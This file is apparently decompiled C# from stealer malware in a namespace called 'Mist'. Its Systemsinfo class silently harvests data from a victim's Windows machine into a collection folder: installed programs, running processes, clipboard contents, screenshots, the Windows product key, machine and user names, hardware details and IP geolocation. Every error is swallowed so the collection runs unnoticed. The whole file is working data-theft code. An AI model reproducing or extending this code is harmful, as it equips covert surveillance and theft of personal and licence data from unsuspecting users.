using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Mist
{
	// Token: 0x02000057 RID: 87
	internal class Systemsinfo
	{
		// Token: 0x0600023A RID: 570 RVA: 0x00010960 File Offset: 0x0000EB60
		[STAThread]
		public static void GetSystemsData(string collectionDir)
		{
			try
			{
				Task[] t01 = new Task[]
				{
					new Task(delegate()
					{
						Systemsinfo.GetSystem(collectionDir);
					})
				};
				Task[] t02 = new Task[]
				{
					new Task(delegate()
					{
						Systemsinfo.GetProg(collectionDir);
					})
				};
				Task[] t03 = new Task[]
				{
					new Task(delegate()
					{
						Systemsinfo.GetProc(collectionDir);
					})
				};
				Task[] t04 = new Task[]
				{
					new Task(delegate()
					{
						BuffBoard.GetClipboard(collectionDir);
					})
				};
				Task[] t05 = new Task[]
				{
					new Task(delegate()
					{
						Screenshot.GetScreenShot(collectionDir);
					})
				};
				new Thread(delegate()
				{
					Task[] t = t01;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = t02;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = t03;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = t04;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = t05;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				Task.WaitAll(t01);
				Task.WaitAll(t02);
				Task.WaitAll(t03);
				Task.WaitAll(t04);
				Task.WaitAll(t05);
			}
			catch
			{
			}
		}

		// Token: 0x0600023B RID: 571 RVA: 0x00010AE8 File Offset: 0x0000ECE8
		public static void GetProg(string Echelon_Dir)
		{
			using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + "\\Programms.txt", false, Encoding.Default))
			{
				try
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
					string[] subKeyNames = registryKey.GetSubKeyNames();
					for (int i = 0; i < subKeyNames.Length; i++)
					{
						string text = registryKey.OpenSubKey(subKeyNames[i]).GetValue("DisplayName") as string;
						if (text != null)
						{
							streamWriter.WriteLine(text);
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600023C RID: 572 RVA: 0x00010B84 File Offset: 0x0000ED84
		public static void GetProc(string Echelon_Dir)
		{
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + "\\Processes.txt", false, Encoding.Default))
				{
					Process[] processes = Process.GetProcesses();
					for (int i = 0; i < processes.Length; i++)
					{
						streamWriter.WriteLine(processes[i].ProcessName.ToString());
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600023D RID: 573 RVA: 0x00010BFC File Offset: 0x0000EDFC
		public static string GetGpuName()
		{
			string result;
			try
			{
				string text = string.Empty;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = text + managementObject["Description"].ToString() + " ";
					}
				}
				result = ((!string.IsNullOrEmpty(text)) ? text : "N/A");
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x0600023E RID: 574 RVA: 0x00010CB8 File Offset: 0x0000EEB8
		public static string GetPhysicalMemory()
		{
			string result;
			try
			{
				ManagementScope scope = new ManagementScope();
				ObjectQuery query = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
				ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher(scope, query).Get();
				long num = 0L;
				foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
				{
					long num2 = Convert.ToInt64(((ManagementObject)managementBaseObject)["Capacity"]);
					num += num2;
				}
				num = num / 1024L / 1024L;
				result = num.ToString();
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x0600023F RID: 575 RVA: 0x00010D64 File Offset: 0x0000EF64
		public static string GetOSInformation()
		{
			foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				try
				{
					return string.Concat(new string[]
					{
						((string)managementObject["Caption"]).Trim(),
						", ",
						(string)managementObject["Version"],
						", ",
						(string)managementObject["OSArchitecture"]
					});
				}
				catch
				{
				}
			}
			return "BIOS Maker: Unknown";
		}

		// Token: 0x06000240 RID: 576 RVA: 0x00010E2C File Offset: 0x0000F02C
		public static string GetComputerName()
		{
			string result;
			try
			{
				ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
				string text = string.Empty;
				foreach (ManagementBaseObject managementBaseObject in instances)
				{
					text = (string)((ManagementObject)managementBaseObject)["Name"];
				}
				result = text;
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000241 RID: 577 RVA: 0x00010EB0 File Offset: 0x0000F0B0
		public static string GetProcessorName()
		{
			string result;
			try
			{
				ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
				string text = string.Empty;
				foreach (ManagementBaseObject managementBaseObject in instances)
				{
					text = (string)((ManagementObject)managementBaseObject)["Name"];
				}
				result = text;
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000242 RID: 578 RVA: 0x00010F34 File Offset: 0x0000F134
		public static void GetSystem(string Echelon_Dir)
		{
			ComputerInfo computerInfo = new ComputerInfo();
			Size size = Screen.PrimaryScreen.Bounds.Size;
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(Systemsinfo.information, false, Encoding.Default))
				{
					TextWriter textWriter = streamWriter;
					string[] array = new string[28];
					array[0] = "==================================================\n Operating system: ";
					int num = 1;
					OperatingSystem osversion = Environment.OSVersion;
					array[num] = ((osversion != null) ? osversion.ToString() : null);
					array[2] = " | ";
					array[3] = computerInfo.OSFullName;
					array[4] = "\n PC user: ";
					array[5] = Environment.MachineName;
					array[6] = "/";
					array[7] = Environment.UserName;
					array[8] = "\n WinKey: ";
					array[9] = WinKey.GetWindowsKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DigitalProductId");
					array[10] = "\n==================================================\n Screen resolution: ";
					int num2 = 11;
					Size size2 = size;
					array[num2] = size2.ToString();
					array[12] = "\n Current time Utc: ";
					array[13] = DateTime.UtcNow.ToString();
					array[14] = "\n Current time: ";
					array[15] = DateTime.Now.ToString();
					array[16] = "\n==================================================\n CPU: ";
					array[17] = Systemsinfo.GetProcessorName();
					array[18] = "\n RAM: ";
					array[19] = Systemsinfo.GetPhysicalMemory();
					array[20] = "\n GPU: ";
					array[21] = Systemsinfo.GetGpuName();
					array[22] = "\n ==================================================\n IP Geolocation: ";
					array[23] = Help.IP;
					array[24] = " ";
					array[25] = Help.Country();
					array[26] = "\n Log Date: ";
					array[27] = Help.date;
					textWriter.WriteLine(string.Concat(array));
					streamWriter.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000126 RID: 294
		public static string information = Help.collectionDir + "\\System_Information.txt";
	}
}
